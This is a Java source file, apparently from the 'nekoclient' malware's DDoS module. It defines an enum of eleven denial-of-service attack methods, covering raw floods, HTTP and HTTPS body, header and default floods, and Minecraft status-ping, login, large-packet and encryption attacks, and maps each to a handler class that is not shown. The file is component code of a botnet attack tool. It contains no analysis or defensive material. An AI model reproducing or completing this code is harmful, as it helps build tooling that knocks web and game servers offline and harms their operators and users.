package dev.neko.nekoclient.api.ddos;

import dev.neko.nekoclient.api.ddos.impl.handler.MethodHandler;
import dev.neko.nekoclient.api.ddos.impl.handler.impl.general.FloodMethod;
import dev.neko.nekoclient.api.ddos.impl.handler.impl.http.HttpBodyMethod;
import dev.neko.nekoclient.api.ddos.impl.handler.impl.http.HttpDefaultMethod;
import dev.neko.nekoclient.api.ddos.impl.handler.impl.http.HttpHeaderMethod;
import dev.neko.nekoclient.api.ddos.impl.handler.impl.https.HttpsBodyMethod;
import dev.neko.nekoclient.api.ddos.impl.handler.impl.https.HttpsDefaultMethod;
import dev.neko.nekoclient.api.ddos.impl.handler.impl.https.HttpsHeaderMethod;
import dev.neko.nekoclient.api.ddos.impl.handler.impl.minecraft.MinecraftEncryptionMethod;
import dev.neko.nekoclient.api.ddos.impl.handler.impl.minecraft.MinecraftLargePacketMethod;
import dev.neko.nekoclient.api.ddos.impl.handler.impl.minecraft.MinecraftLoginMethod;
import dev.neko.nekoclient.api.ddos.impl.handler.impl.minecraft.MinecraftStatusPingMethod;
import java.util.function.Supplier;

public enum Method {
   FLOOD(FloodMethod::new),
   HTTP_DEFAULT(HttpDefaultMethod::new),
   HTTP_BODY(HttpBodyMethod::new),
   HTTP_HEADER(HttpHeaderMethod::new),
   HTTPS_DEFAULT(HttpsDefaultMethod::new),
   HTTPS_BODY(HttpsBodyMethod::new),
   HTTPS_HEADER(HttpsHeaderMethod::new),
   MINECRAFT_STATUS_PING(MinecraftStatusPingMethod::new),
   MINECRAFT_LOGIN(MinecraftLoginMethod::new),
   MINECRAFT_LARGE_PACKET(MinecraftLargePacketMethod::new),
   MINECRAFT_ENCRYPTION(MinecraftEncryptionMethod::new);

   private final Supplier<MethodHandler> handler;

   private Method(Supplier<MethodHandler> handler) {
      this.handler = handler;
   }

   public final MethodHandler createHandler() {
      return this.handler.get();
   }
}
